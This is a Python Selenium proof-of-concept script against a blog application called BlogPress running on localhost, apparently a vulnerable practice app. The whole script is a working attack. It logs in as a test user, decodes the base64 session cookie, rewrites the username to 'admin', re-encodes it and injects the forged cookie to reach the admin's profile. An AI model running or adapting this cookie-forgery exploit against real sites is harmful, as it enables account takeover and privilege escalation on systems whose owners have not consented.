from selenium import webdriver
import argparse
import time
from selenium.webdriver.common.by import By
import urllib.parse
import base64
parser = argparse.ArgumentParser(description='Port IP')
parser.add_argument('-p', dest='port', default=8001,
                    help='port where the application is running')

args = parser.parse_args()
port = args.port

# Starting the real POC

browser = webdriver.Firefox()
browser.get(f"http://localhost:{port}/user/login?from=/")
browser.set_window_size(827, 707)
time.sleep(1)
browser.find_element(By.ID, "username").click()
browser.find_element(By.ID, "username").send_keys("test")
browser.find_element(By.ID, "password").click()
browser.find_element(By.ID, "password").send_keys("test")
browser.find_element(By.ID, "Login").click()
time.sleep(1)
# Obtaining the cookie
cookie = browser.get_cookie("BlogPress_User").get("value")
# URL decoding the cookie
cookie = urllib.parse.unquote(cookie)
# Decoding the cookie from Base64
value = base64.b64decode(cookie).decode()
# Altering the new cookie
cookie = value.replace("test","admin")
# Enconding the cookie in b64
cookie = base64.b64encode(cookie.encode()).decode()

# Logout add the cookie and we are in
browser.find_element(By.XPATH, "//a[contains(@href, \'#\')]").click()
time.sleep(0.2)
browser.find_element(By.LINK_TEXT, "Logout").click()
time.sleep(0.2)
browser.add_cookie({"name":"BlogPress_User","value":cookie})
browser.find_element(By.LINK_TEXT, "BlogPress").click()
time.sleep(0.2)
browser.find_element(By.CSS_SELECTOR, ".dropdown-toggle").click()
browser.find_element(By.LINK_TEXT, "Edit Profile").click()
  



